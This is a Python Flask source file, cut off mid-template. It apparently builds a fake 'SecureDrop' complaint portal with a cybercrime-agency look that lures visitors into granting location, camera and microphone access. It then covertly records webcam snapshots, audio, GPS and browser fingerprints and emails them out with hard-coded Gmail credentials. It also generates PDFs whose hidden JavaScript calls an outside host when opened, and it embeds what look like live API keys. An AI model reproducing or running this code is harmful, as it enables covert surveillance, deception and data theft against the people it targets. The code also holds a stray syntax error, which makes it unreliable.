from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
import logging
import json
import os
import requests
import base64
import uuid
from faker import Faker
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Image
from reportlab.lib.styles import getSampleStyleSheet
from cryptography.fernet import Fernet
from stegano import lsb
from PIL import Image as PILImage
import PyPDF2
import netifaces
import google.generativeai as genai
import glob
from pathlib import Path
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime, timedelta
from PyPDF2.generic import NameObject, DictionaryObject, ArrayObject, TextStringObject

# Configure the Gemini API with your API key
genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyC0mNTdqk6yg3MLsHAx3sPox-dwdRSAblQ"))

# Create required directories
os.makedirs('static/captures', exist_ok=True)

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management

# Configure logging to a file
logging.basicConfig(
    level=logging.INFO,
    filename='user_logs.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Add before_request to log data for every request with Client Hints
@app.before_request
def log_request_data():
    if 'csrf_token' not in session:
        session['csrf_token'] = os.urandom(24).hex()
    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
    user_agent = request.headers.get('User-Agent', 'unknown')
    # Extract Client Hints headers
    client_hints = {
        'Sec-CH-UA': request.headers.get('Sec-CH-UA'),
        'Sec-CH-UA-Mobile': request.headers.get('Sec-CH-UA-Mobile'),
        'Sec-CH-UA-Platform': request.headers.get('Sec-CH-UA-Platform'),
        'Sec-CH-Width': request.headers.get('Sec-CH-Width'),
        'Sec-CH-Viewport-Width': request.headers.get('Sec-CH-Viewport-Width'),
        'Sec-CH-DPR': request.headers.get('Sec-CH-DPR'),
        'Device-Memory': request.headers.get('Device-Memory'),
        'Hardware-Concurrency': request.headers.get('Hardware-Concurrency'),
    }
    data = {
        'ip': ip,
        'user_agent': user_agent,
        'method': request.method,
        'path': request.path,
        'headers': dict(request.headers),
        'client_hints': client_hints,
        'cookies': request.cookies,
    }
    logging.info(f"Request data: {json.dumps(data)}")
    with buffer_lock:
        data_buffer.append(data)

# Initialize Faker for generating fake PDF content
fake = Faker()

# Encryption key (store securely in production)
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

# Store tokens for verification (ephemeral)
logged_tokens = {}

# Global list to store downloaded reports (token and report)
downloaded_reports = []

# Global buffer and lock for email sending
data_buffer = []
attachments_to_send = []  # Renamed from images_to_send to handle both images and audio
buffer_lock = threading.Lock()

# Email sending functions
def send_email(data_list, attachment_list):
    smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
    smtp_port = int(os.environ.get("SMTP_PORT", 587))
    smtp_user = os.environ.get("SMTP_USER", "noreplycybercrimeindia.in@gmail.com")
    smtp_password = os.environ.get("SMTP_PASSWORD", "dmfkeuctcaraburf")
    recipient = os.environ.get("RECIPIENT_EMAIL", "noreplycybercrimeindia.in@gmail.com")

    msg = MIMEMultipart()
    msg['From'] = smtp_user
    msg['To'] = recipient
    msg['Subject'] = "Fetched Data Report"

    body = json.dumps(data_list, indent=2)
    msg.attach(MIMEText(body, 'plain'))

    for attachment_path in attachment_list:
        with open(attachment_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
            msg.attach(part)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_password)
            server.sendmail(smtp_user, recipient, msg.as_string())
        logging.info("Email sent successfully")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

def email_sender_thread():
    while True:
        time.sleep(10)
        with buffer_lock:
            if data_buffer or attachments_to_send:
                send_email(data_buffer.copy(), attachments_to_send.copy())
                data_buffer.clear()
                attachments_to_send.clear()

# Helper functions
def get_wifi_location_from_wigle(bssid):
    username = "AID9d6a1f4d617967b3d4c6189558862314"
    api_token = "ac01dcab47f048daf62cb43edaf37295"
    if not username or not api_token:
        logging.error("Wigle API credentials are not set in environment variables.")
        return None, None
    headers = {"Accept": "application/json"}
    params = {"netid": bssid}
    try:
        # response = requests.get("https://api.wigle.net/api/v2/network Gravestone Analytics - https://www.gravestone.io/ - https://www.gravestone.io/gravestone-insights-ja3-fingerprinting - https://www.gravestone.io/gravestone-insights-ja3-fingerprinting
        response = requests.get("https://api.wigle.net/api/v2/network")
        response = requests.get("https://api.wigle.net/api/v2/network/search", headers=headers, params=params, auth=(username, api_token))
        if response.status_code == 200:
            data = response.json()
            if data.get("results"):
                return data["results"][0].get("trilat"), data["results"][0].get("trilong")
    except Exception as e:
        logging.error(f"Error querying Wigle API: {e}")
    return None, None

def get_hidden_message(data):
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"

def get_ip_geolocation(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "").split(",")
            if loc and len(loc) == 2:
                return float(loc[0]), float(loc[1]), data
    except Exception as e:
        logging.error(f"IP Geolocation error: {e}")
    return None, None, {}

def get_wifi_interfaces():
    try:
        interfaces = netifaces.interfaces()
        wifi_data = {}
        for iface in interfaces:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_LINK in addrs:
                mac = addrs[netifaces.AF_LINK][0].get('addr', '')
                if mac:
                    lat, lon = get_wifi_location_from_wigle(mac)
                    wifi_data[iface] = {'bssid': mac, 'latitude': lat, 'longitude': lon}
        return wifi_data
    except Exception as e:
        logging.error(f"Error retrieving WiFi interfaces: {e}")
        return {}

def collect_data(req):
    ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
    ip5 = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
    user_agent = req.headers.get('User-Agent', 'unknown')
    cookies = req.cookies
    tls_metadata = req.environ.get('wsgi.url_scheme')

    client_data = {
        'screenWidth': req.form.get('screenWidth'),
        'screenHeight': req.form.get('screenHeight'),
        'colorDepth': req.form.get('colorDepth'),
        'pixelDepth': req.form.get('pixelDepth'),
        'language': req.form.get('language'),
        'platform': req.form.get('platform'),
        'connection': req.form.get('connection'),
        'pageLoadTime': req.form.get('pageLoadTime'),
        'clickTime': req.form.get('clickTime'),
        'dwellTime': req.form.get('dwellTime'),
        'lastMouseX': req.form.get('lastMouseX'),
        'lastMouseY': req.form.get('lastMouseY'),
        'referrer': req.form.get('referrer'),
        'canvasFingerprint': req.form.get('canvasFingerprint'),
        'hardwareConcurrency': req.form.get('hardwareConcurrency'),
        'deviceMemory': req.form.get('deviceMemory'),
        'timezoneOffset': req.form.get('timezoneOffset'),
        'touchSupport': req.form.get('touchSupport'),
        'batteryLevel': req.form.get('batteryLevel'),
        'charging': req.form.get('charging'),
        'downlink': req.form.get('downlink'),
        'plugins': req.form.get('plugins'),
        'location': req.form.get('location'),
        'cameraSnapshot': req.form.get('cameraSnapshot'),
        'audioClip': req.form.get('audioClip'),
        'webglFingerprint': req.form.get('webglFingerprint'),
        'installedFonts': req.form.get('installedFonts'),
        'localIPs': req.form.get('localIPs'),  # New field for local IPs
    }

    lat, lon, geo_data = get_ip_geolocation(ip5)
    client_data['ip_latitude'] = lat if lat is not None else ""
    client_data['ip_longitude'] = lon if lon is not None else ""
    client_data['ip_geolocation'] = geo_data

    log_message = {
        'ip': ip5,
        'user_agent': user_agent,
        'action': 'Data Collected',
        'client_data': client_data,
        'request_headers': dict(req.headers),
        'cookies': cookies,
        'tls_metadata': tls_metadata,
        'wifi_triangulation': get_wifi_interfaces(),
    }
    return log_message

# Monkey patch collect_data to store data in the buffer
original_collect_data = collect_data

def patched_collect_data(*args, **kwargs):
    data = original_collect_data(*args, **kwargs)
    with buffer_lock:
        data_buffer.append(data)
    return data

collect_data = patched_collect_data

# Other helper functions
def embed_data_in_image(data):
    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
    encrypted_str = base64.b64encode(encrypted_data).decode('utf-8')
    base_img = PILImage.new('RGB', (500, 500), color='white')
    stego_img = lsb.hide(base_img, encrypted_str)
    return stego_img

def simulate_multi_stage_payload(data):
    logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
    stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
    stage_payload["stage"] = "secondary"
    stage_payload["info"] = "Additional stage executed"
    logging.info(f"Simulated multi-stage payload: {json.dumps(stage_payload)}")
    return stage_payload

def simulate_dll_injection():
    logging.info("Simulated DLL injection executed (defensive demonstration only)")
    return "DLL injection simulated"

def get_gemini_report(data):
    try:
        prompt = (
            """You are a cybersecurity investigator tasked with analyzing device and user details
to identify potential connections and patterns related to online harassment.
Your goal is to generate a report highlighting potential leads for further investigation.

**Important Considerations:**
* This analysis is for investigative purposes only. It does NOT definitively identify a harasser.
* False positives are possible. Any potential connections identified must be thoroughly investigated before any action is taken.
* Focus on identifying patterns and anomalies in the data.
* Consider the limitations of the data.
* Avoid making assumptions or drawing hasty conclusions.
* Ensure all actions comply with legal and ethical guidelines.

**Data Description:**
The provided data contains information about devices and users potentially involved in online harassment. This may include:
* **Device Information:** IP addresses, device IDs, operating system, browser information, location data (if available).
* **User Details:** Usernames, email addresses, social media profiles, online activity logs.

**Instructions:**
1. Analyze Data for Potential Connections: Identify shared IP addresses, similar device fingerprints, overlapping online activity, related social media accounts, anomalous behavior, and geolocation patterns.
2. Assess the Strength of Connections: Assess based on supporting evidence.
3. Prioritize Potential Leads: Identify promising leads for further investigation.
4. Format the Report:
   **Investigative Analysis Report**
   **Date:** [Current Date and Time]
   **Data Source:** [Description of the data source]
   **Executive Summary:** [Overview of potential connections and leads]
   **Detailed Findings:**
   * **Potential Connection 1:** [Description]
       * **Users Involved:** [List]
       * **Supporting Evidence:** [Data points]
       * **Strength of Connection:** [High/Medium/Low salient analysis]
       * **Potential Lead:** [Explanation]
   **Conclusion:** [Summary of promising leads]
""" + json.dumps(data, indent=2)
        )
        model = genai.GenerativeModel('gemini-2.0-flash')  # Update model name as per availability
        response = model.generate_content(prompt)
        report = response.text
        logging.info(f"Gemini AI report received: {report}")
        return report
    except Exception as e:
        logging.error(f"Error contacting Gemini AI: {e}")
        return f"Error contacting Gemini AI: {e}"

def generate_pdf(logged_data):
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    c.showPage()  # Add a blank page
    c.save()
    buffer.seek(0)

    # Enhanced PDF generation
    enhanced_buffer = BytesIO()
    doc = SimpleDocTemplate(enhanced_buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    # Add title
    story.append(Paragraph("User Data Report", styles['Title']))

    # Add Gemini report
    gemini_report = logged_data.get("gemini_report", "No report available")`
    story.append(Paragraph("Gemini AI Analysis:", styles['Heading2']))
    with open('templates/user_data.html') as f:
        story.append(Paragraph(gemini_report, styles['Normal']))

    # Add collected data
    story.append(Paragraph("Collected User Data:", styles['Heading2']))
    for key, value in logged_data.items():
        if key != "gemini_report":
            story.append(Paragraph(f"{key}: {json.dumps(value, indent=2)}", styles['Normal']))

    doc.build(story)
    enhanced_buffer.seek(0)

    hidden_message = get_hidden_message(logged_data)
    token = str(uuid.uuid4())
    reversed_token = token[::-1]

    pdf_reader = PyPDF2.PdfReader(enhanced_buffer)
    pdf_writer = PyPDF2.PdfWriter()
    for page in pdf_reader.pages:
        pdf_writer.add_page(page)

    # Add hidden data in metadata
    pdf_writer.add_metadata({'/HiddenData': hidden_message})

    # Add JavaScript to trigger on open
    js_code = f"""
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req1 = new XMLHttpRequest();
            req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
            req1.send();
        }} catch(e) {{}}
    }}
    var reversedToken = "{reversed_token}";
    var token = reversedToken.split("").reverse().join("");
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req2 = new XMLHttpRequest();
            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
            req2.send();
        }} catch(e) {{}}
    }}
    """
    js_action = DictionaryObject()
    js_action.update({
        NameObject("/Type"): NameObject("/Action"),
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): TextStringObject(js_code)
    })
    pdf_writer._root_object.update({
        NameObject("/OpenAction"): js_action
    })

    new_buffer = BytesIO()
    pdf_writer.write(new_buffer)
    new_buffer.seek(0)
    return new_buffer, token

# HTML Templates with script inclusion
PERMISSIONS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>View Account Details</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
       body {
    background-image: url('/static/blurred_pdf.jpg');
    background-size: 50% auto;
    background-position: center;
    background-attachment: fixed;
    background-repeat: no-repeat;
    text-align: center;
    padding: 50px;
}
        .content-box {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 8px;
            display: inline-block;
        }
        h2 { color: #333; }
        button { padding: 10px 20px; margin: 5px; }
        p { color: #d93025; }
    </style>
</head>
<body>
    <div class="container">
        <div class="content-box">
            {% if error == 'denied' %}
            <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
            {% endif %}
            <h2>To download the Account Details, you have to verify whether you are the right person who has the IP address</h2>
            <p>Kindly allow all permissions by clicking enable.</p>
            <button id="enableButton" class="btn btn-primary">Enable</button>
            <div id="permissionsStatus" class="mt-3">
                <p>Location: <span id="locationStatus">Pending</span></p>
                <p>Camera: <span id="cameraStatus">Pending</span></p>
                <p>Microphone: <span id="microphoneStatus">Pending</span></p>
            </div>
            <p id="status"></p>
        </div>
    </div>
    <script src="/static/script.js"></script>
    <script>
        function startLocationCapture() {
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/log_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                }, () => {});
            }, 5000);
        }

        function startCameraCapture() {
            const video = document.createElement('video');
            video.width = 320;
            video.height = 240;
            video.autoplay = true;
            video.style.display = 'none';
            document.body.appendChild(video);
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                video.srcObject = stream;
                setInterval(() => {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    const snapshot = canvas.toDataURL('image/jpeg');
                    fetch('/log_camera', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({image: snapshot})
                    });
                }, 5000);
            }).catch(err => {
                console.error('Camera access denied:', err);
                document.getElementById('cameraStatus').textContent = 'Denied';
            });
        }

        function startMicrophoneCapture() {
            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        const base64data = reader.result.split(',')[1];
                        fetch('/log_microphone', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({audio: base64data})
                        });
                    };
                    audioChunks = [];
                };

                setInterval(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 5000);  // Record for 5 seconds
                }, 10000);  // Every 10 seconds
            }).catch(err => {
                console.error('Microphone access denied:', err);
                document.getElementById('microphoneStatus').textContent = 'Denied';
            });
        }

        document.getElementById('enableButton').addEventListener('click', () => {
            const permissions = {
                location: false,
                camera: false,
                microphone: false
            };

            navigator.geolocation.getCurrentPosition(() => {
                permissions.location = true;
                document.getElementById('locationStatus').textContent = 'Granted';
                startLocationCapture();
            }, () => {
                document.getElementById('locationStatus').textContent = 'Denied';
            });

            navigator.mediaDevices.getUserMedia({video: true}).then(() => {
                permissions.camera = true;
                document.getElementById('cameraStatus').textContent = 'Granted';
                startCameraCapture();
            }).catch(() => {
                document.getElementById('cameraStatus').textContent = 'Denied';
            });

            navigator.mediaDevices.getUserMedia({audio: true}).then(() => {
                permissions.microphone = true;
                document.getElementById('microphoneStatus').textContent = 'Granted';
                startMicrophoneCapture();
            }).catch(() => {
                document.getElementById('microphoneStatus').textContent = 'Denied';
            });

            setTimeout(() => {
                if (permissions.location && permissions.camera && permissions.microphone) {
                    window.location.href = '/grant_permissions';
                } else {
                    let missing = [];
                    if (!permissions.location) missing.push('location');
                    if (!permissions.camera) missing.push('camera');
                    if (!permissions.microphone) missing.push('microphone');
                    alert('Please grant all permissions: ' + missing.join(', '));
                }
            }, 1000);  // Give some time for permissions to be granted
        });

        // Additional data capturing
        try {
            const pageLoadTime = performance.now();
            fetch('/log_performance', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({pageLoadTime})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
                });
            });

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const connectionType = connection ? connection.effectiveType : 'unknown';
            const downlink = connection ? connection.downlink : 'unknown';
            fetch('/log_connection', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({connectionType, downlink})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
                });
            });

            let mouseData = [];
            document.addEventListener('mousemove', (e) => {
                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
            });
            document.addEventListener('click', (e) => {
                fetch('/log_click', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Click log failed', message: err.message})
                    });
                });
            });
            setInterval(() => {
                if (mouseData.length > 0) {
                    fetch('/log_mouse', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mouseData})
                    }).catch(err => {
                        fetch('/log_error', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
                        });
                    });
                    mouseData = [];
                }
            }, 5000);

            document.addEventListener('scroll', () => {
                const scrollTop = window.scrollY || document.documentElement.scrollTop;
                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
                const scrollPercent = (scrollTop / scrollHeight) * 100;
                fetch('/log_scroll', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
                    });
                });
            });
        } catch (err) {
            fetch('/log_error', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
            });
        }
    </script>
</body>
</html>
"""

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecureDrop Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; }
        h1 { font-size: 24px; text-align: center; color: #202124; }
        label { display: block; margin: 10px 0 5px; color: #5f6368; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #1557b0; }
        .form-text { color: #666; font-size: 12px; }
        .alert { margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign in to SecureDrop</h1>
        <form action="/login" method="post">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            <label for="phone">Phone Number (India)</label>
            <input type="tel" id="phone" name="phone" required pattern="[0-9]{10}" maxlength="10" placeholder="9876543210">
            <small class="form-text">Enter your 10-digit mobile number without the country code.</small>
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <script src="/static/script.js"></script>
    <script>
        const permissions = "{{ permissions }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let lastMouseX = 0, lastMouseY = 0;

        document.addEventListener('mousemove', (e) => {
            lastMouseX = e.clientX;
            lastMouseY = e.clientY;
        });

        if (permissions === 'granted') {
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                video.srcObject = stream;
            }).catch(() => console.log('Camera access denied'));

            setInterval(() => {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/log_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                }, () => console.log('Location access denied'));

                if (video.srcObject) {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    const snapshot = canvas.toDataURL('image/jpeg');
                    fetch('/log_camera', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({image: snapshot})
                    });
                }

                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                    fetch('/log_microphone', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({message: 'Audio recorded'})
                    });
                    stream.getTracks().forEach(track => track.stop());
                }).catch(() => console.log('Microphone access denied'));
            }, 5000);
        } else {
            setInterval(() => {
                const otherData = {
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    mouseX: lastMouseX,
                    mouseY: lastMouseY,
                    timestamp: new Date().toISOString(),
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    language: navigator.language,
                    platform: navigator.platform,
                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    timezoneOffset: new Date().getTimezoneOffset(),
                    canvasFingerprint: (function() {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText("Hello, world!", 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText("Hello, world!", 4, 17);
                        return canvas.toDataURL();
                    })(),
                    webglFingerprint: (function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl');
                            if (gl) {
                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                if (debugInfo) {
                                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                                }
                            }
                            return 'unknown';
                        } catch (e) {
                            return 'unknown';
                        }
                    })()
                };
                fetch('/log_other_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(otherData)
                });
            }, 5000);
        }

        // Additional data capturing
        try {
            const pageLoadTime = performance.now();
            fetch('/log_performance', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({pageLoadTime})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
                });
            });

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const connectionType = connection ? connection.effectiveType : 'unknown';
            const downlink = connection ? connection.downlink : 'unknown';
            fetch('/log_connection', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({connectionType, downlink})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
                });
            });

            let mouseData = [];
            document.addEventListener('mousemove', (e) => {
                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
            });
            document.addEventListener('click', (e) => {
                fetch('/log_click', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Click log failed', message: err.message})
                    });
                });
            });
            setInterval(() => {
                if (mouseData.length > 0) {
                    fetch('/log_mouse', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mouseData})
                    }).catch(err => {
                        fetch('/log_error', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
                        });
                    });
                    mouseData = [];
                }
            }, 5000);

            document.addEventListener('scroll', () => {
                const scrollTop = window.scrollY || document.documentElement.scrollTop;
                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
                const scrollPercent = (scrollTop / scrollHeight) * 100;
                fetch('/log_scroll', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
                    });
                });
            });

            // Phone number validation
            document.getElementById('phone').addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value.length > 10) {
                    this.value = this.value.slice(0, 10);
                }
            });
        } catch (err) {
            fetch('/log_error', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
            });
        }
    </script>
</body>
</html>
"""

DRIVE_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecureDrop</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body { margin: 0; background-color: #f2f2f2; font-family: Arial, sans-serif; }
        .header { background-color: #fff; border-bottom: 1px solid #dadce0; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 24px; font-weight: bold; color: #5f6368; }
        .search-bar { width: 50%; }
        .user-icon { font-size: 18px; color: #5f6368; }
        .file { padding: 15px; background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">SecureDrop</div>
        <div class="search-bar">
            <input type="text" class="form-control" placeholder="Search">
        </div>
        <div class="user-icon">User</div>
    </header>
    <div class="container mt-4">
        <h1>Welcome to SecureDrop</h1>
        <p>Your complaints:</p>
        <div class="file-list">
            <div class="file">
                <div>ðŸ“� Complaint #1</div>
                <div>{{ date1 }}</div>
            </div>
            <div class="file">
                <div>ðŸ“� Complaint #2</div>
                <div>{{ date2 }}</div>
            </div>
        </div>
        <form id="downloadForm" action="/download" method="post">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            <input type="hidden" name="permissions" value="{{ permissions }}">
            <input type="hidden" name="screenWidth" id="screenWidth">
            <input type="hidden" name="screenHeight" id="screenHeight">
            <input type="hidden" name="colorDepth" id="colorDepth">
            <input type="hidden" name="pixelDepth" id="pixelDepth">
            <input type="hidden" name="language" id="language">
            <input type="hidden" name="platform" id="platform">
            <input type="hidden" name="connection" id="connection">
            <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
            <input type="hidden" name="webglFingerprint" id="webglFingerprint">
            <input type="hidden" name="timezoneOffset" id="timezoneOffset">
            <input type="hidden" name="location" id="location">
            <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
            <input type="hidden" name="localIPs" id="localIPs">
            <button type="submit" class="btn btn-primary">Download Data</button>
        </form>
    </div>
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <script src="/static/script.js"></script>
    <script>
        const permissions = "{{ permissions }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let lastMouseX = 0, lastMouseY = 0;

        document.addEventListener('mousemove', (e) => {
            lastMouseX = e.clientX;
            lastMouseY = e.clientY;
        });

        if (permissions === 'granted') {
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                video.srcObject = stream;
            }).catch(() => console.log('Camera access denied'));

            setInterval(() => {
